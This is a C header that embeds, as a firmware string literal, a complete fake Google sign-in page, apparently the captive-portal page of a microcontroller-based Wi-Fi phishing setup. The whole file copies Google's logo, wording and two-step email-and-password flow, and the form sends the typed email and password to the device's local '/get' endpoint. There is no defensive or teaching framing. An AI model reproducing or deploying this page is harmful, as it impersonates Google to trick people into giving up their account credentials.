#ifndef GOOGLE_H
#define GOOGLE_H

const char GOOGLE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Sign In</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f7f7f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 0;
        }

        .container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 32px;
            width: 350px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            margin-bottom: 24px;
        }

        .logo svg {
            height: 36px;
            width: auto;
        }

        .title {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
            text-align: center;
        }

        .subtitle {
            font-size: 16px;
            font-weight: 400;
            color: #5f6368;
            margin-bottom: 24px;
            text-align: center;
        }

        .form-group {
            position: relative;
            width: 100%;
            margin-bottom: 24px;
            /* Hide password field initially */
            display: block; /* Default display */
        }

        .form-group.hidden {
            display: none;
        }

        .form-control {
            width: 100%;
            padding: 10px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            font-size: 16px;
            transition: border-color 0.3s ease;
            box-sizing: border-box;
        }

        .form-control:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.1);
        }

        .form-label {
            position: absolute;
            top: 10px;
            left: 10px;
            font-size: 16px;
            color: #5f6368;
            transition: transform 0.3s ease, font-size 0.3s ease, color 0.3s ease;
            pointer-events: none;
            background-color: #fff;
            padding: 0 4px;
            z-index: 1; /* Ensure label is above input text during transition */
        }

        .form-control:focus + .form-label,
        .form-control:not(:placeholder-shown) + .form-label {
            transform: translateY(-20px) translateX(-4px);
            font-size: 12px;
            color: #1a73e8;
        }

        .forgot-email {
            display: block;
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            margin-bottom: 16px;
            text-align: left;
            width: 100%;
        }

        .forgot-email.hidden {
            display: none;
        }

        .forgot-email:hover {
            text-decoration: underline;
        }

        .create-account {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            margin-right: auto;
        }

        .create-account:hover {
            text-decoration: underline;
        }

        .next-button {
            background-color: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease, box-shadow 0.3s ease;
            margin-left: auto;
        }

        .next-button:hover {
            background-color: #145db0;
        }

        .next-button:focus {
            outline: none;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.3);
        }

        .button-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
            margin-top: 32px;
        }
        .text-area{
            color: #5f6368;
            font-size: 12px;
            margin-top: 8px;
            text-align: left;
            width: 100%;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                <g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g>
                <g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g>
                <g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g>
                <g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g>
                <g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g>
                <g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g>
            </svg>
        </div>
        <h1 class="title">Sign in</h1>
        <h2 class="subtitle">Use your Google Account</h2>

        <form action="/get" method="GET" id="auth-form" style="width: 100%; display: flex; flex-direction: column; align-items: center;">

            <div class="form-group" id="email-group">
                <input type="text" id="email" name="email" class="form-control" placeholder=" " required>
                <label for="email" class="form-label">Email or phone</label>
            </div>

            <div class="form-group hidden" id="password-group">
                <input type="password" id="password" name="password" class="form-control" placeholder=" " required>
                <label for="password" class="form-label">Enter your password</label>
            </div>

            <a href="#" class="forgot-email" id="forgot-email-link">Forgot email?</a>
            <div class="text-area" id="guest-mode-text">
                Not your device? Use Guest mode to sign in privately.
                <a href="#" style="color: #1a73e8; text-decoration: none;">Learn more</a>
            </div>

            <div class="button-container">
                <a href="#" class="create-account" id="create-account-link">Create account</a>
                <button type="button" class="next-button" id="next-button">Next</button>
            </div>
        </form>
    </div>

    <script>
        const authForm = document.getElementById('auth-form');
        const emailGroup = document.getElementById('email-group');
        const passwordGroup = document.getElementById('password-group');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const nextButton = document.getElementById('next-button');
        const forgotEmailLink = document.getElementById('forgot-email-link');
        const createAccountLink = document.getElementById('create-account-link');
        const guestModeText = document.getElementById('guest-mode-text');
        const subtitle = document.querySelector('.subtitle'); // Get the subtitle element

        let currentStep = 1;

        function updateLabel(inputElement) {
            const label = document.querySelector(`label[for="${inputElement.id}"]`);
            if (inputElement.value.trim() !== '') {
                label.classList.add('label-up');
            } else {
                label.classList.remove('label-up');
            }
        }

        const formControls = document.querySelectorAll('.form-control');
        formControls.forEach(input => {
            input.addEventListener('input', () => updateLabel(input));
            input.addEventListener('focus', () => {
                const label = document.querySelector(`label[for="${input.id}"]`);
                label.classList.add('label-up');
            });
            input.addEventListener('blur', () => {
                if (input.value.trim() === '') {
                    const label = document.querySelector(`label[for="${input.id}"]`);
                    label.classList.remove('label-up');
                }
            });
            if (input.value.trim() !== '') {
                updateLabel(input);
            }
        });


        nextButton.addEventListener('click', () => {
            if (currentStep === 1) {
                if (emailInput.value.trim() === '') {
                    alert('Please enter your email or phone.');
                    return;
                }

                emailGroup.classList.add('hidden');
                forgotEmailLink.classList.add('hidden');
                guestModeText.classList.add('hidden');
                createAccountLink.classList.add('hidden');

                passwordGroup.classList.remove('hidden');

                subtitle.textContent = emailInput.value.trim();

                nextButton.textContent = 'Sign in';
                nextButton.type = 'submit';

                currentStep = 2;
                passwordInput.focus();
            }
        });
    </script>
</body>
</html>
)rawliteral";

#endif